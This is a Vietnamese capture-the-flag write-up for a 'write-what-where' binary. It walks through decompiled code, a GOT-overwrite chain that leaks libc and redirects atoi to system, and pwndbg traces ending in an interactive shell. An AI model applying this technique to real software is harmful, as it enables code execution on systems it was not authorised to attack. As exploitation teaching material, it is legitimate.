# Phân tích file

```python
write-what-where: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ee124ada64e961774c24b669bbe4aab30ef7f0e6, for GNU/Linux 4.4.0, not stripped
```

```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Ta có thể overwrite got do Partial RELRO

# Reverse file

- Main:
    
    ```python
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      _DWORD *v3; // [rsp+0h] [rbp-30h]
      int buf; // [rsp+Ch] [rbp-24h] BYREF
      char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v6; // [rsp+28h] [rbp-8h]
    
      v6 = __readfsqword(0x28u);
      init(argc, argv, envp);
      puts("write");
      puts("what?");
      read(0, &buf, 4uLL);
      puts("where?");
      read(0, nptr, 9uLL);
      v3 = (_DWORD *)atoi(nptr);
      *v3 = buf;
      exit(0);
    }
    ```
    
- Init:
    
    ```python
    int init()
    {
      setvbuf(stdin, 0LL, 2, 0LL);
      return setvbuf(_bss_start, 0LL, 2, 0LL);
    }
    ```
    
    - Bài này cho phép ta nhập 4 byte vào 1 địa chỉ bất kì.

# Exploit

- Mình sẽ write got_exit về puts("write");(không gọi init) để mình có thể write got_setvbuf thành plt_puts và stdin thành got_puts sau khi ghi xong mình sẽ write got_exit về lại đầu main để nó chạy qua hàm init và leak libc cho mình.
- Do mỗi lần chỉ ghi được 4 byte nên mình có thể ghi 2 lần 1 lần 4 bytes đầu rồi lần 2 là 4 bytes sau.
- Sau khi leak được libc mình sẽ write lại stdin để không bị lỗi rồi sau đó tính system và write 4 bytes cuối của atoi thành 4 bytes cuối của system lúc này mình chỉ cần nhập input là "/bin/sh\x00" thì khi đến atoi nó sẽ là system("/bin/sh") và get shell.
    
- Write got_exit
    
    ```python
    [0x404038] exit@GLIBC_2.2.5 -> 0x4011ca (main+33) ◂— lea    rax, [rip + 0xe33]
    ```
    
- Write 4 bytes đầu setbuf
    
    ```python
    [0x404028] setvbuf@GLIBC_2.2.5 -> 0x7fff00401030
    ```
    
- Write 4 bytes sau setbuf
    
    ```python
    [0x404028] setvbuf@GLIBC_2.2.5 -> 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]
    ```
    
- Write 4 bytes đầu stdin
    
    ```python
    0x404060 <stdin@GLIBC_2.2.5>:   0x00007fff00404018
    ```
    
- Write 4 bytes sau stdin
    
    ```python
    0x404060 <stdin@GLIBC_2.2.5>:   0x0000000000404018
    ```
    
- Write exit về lại main
    
    ```python
    [0x404038] exit@GLIBC_2.2.5 -> 0x4011a9 (main) ◂— push   rbp
    ```
    
- Leak libc
    
    ```python
    ► 0x401183 <init+29>    call   setvbuf@plt <setvbuf@plt>
            stream: 0x404018 (puts@got.plt) —▸ 0x7ffff7e4e5a0 (puts) ◂— endbr64
            buf: 0x0
            modes: 0x2
            n: 0x0
    
    pwndbg> got
    
    GOT protection: Partial RELRO | GOT functions: 5
    [0x404028] setvbuf@GLIBC_2.2.5 -> 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]
    
    ```
    
    ```python
    [*] Puts: 0x7ffff7e4e5a0
    [*] libc_base: 0x7ffff7dc7000
    [*] system: 0x7ffff7e1c410
    ```
    
- Sau khi leak libc xong mình sẽ write lại giá trị cho stdin vì nếu bị thay đổi sẽ ảnh hưởng không cho ta lên shell được
- Write 4 bytes đầu stdin
    
    ```python
    0x404060 <stdin@GLIBC_2.2.5>:   0x00000000f7fb2980
    ```
    
- Write 4 bytes sau stdin
    
    ```python
    0x404060 <stdin@GLIBC_2.2.5>:   0x00007ffff7fb2980
    ```
    
- Write exit về start để chương trình setup lại mọi thứ để không bị lỗi.
    
    ```python
    [0x404038] exit@GLIBC_2.2.5 -> 0x401080 (_start) ◂— endbr64
    ```
    
- Write 4 bytes đầu của atoi thành 4 byte đầu của system
    
    ```python
    [0x404030] atoi@GLIBC_2.2.5 -> 0x7ffff7e1c410 (system) ◂— endbr64
    ```
    
- Nhập input "/bin/sh\x00" và lên shell
    
    ```python
    ► 0x40122a <main+129>    call   atoi@plt <atoi@plt>
            nptr: 0x7fffffffdd50 ◂— 0x68732f6e69622f /* '/bin/sh' */
    
    pwndbg> got
    [0x404030] atoi@GLIBC_2.2.5 -> 0x7ffff7e1c410 (system) ◂— endbr64
    ```
    
- Shell
    
    ```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    [*] Puts: 0x7fb7129f29d0
    [*] libc_base: 0x7fb712972000
    [*] system: 0x7fb7129c1a60
    [*] stdin: 0x7fb712b529a0
    [*] Switching to interactive mode
    $
    ```
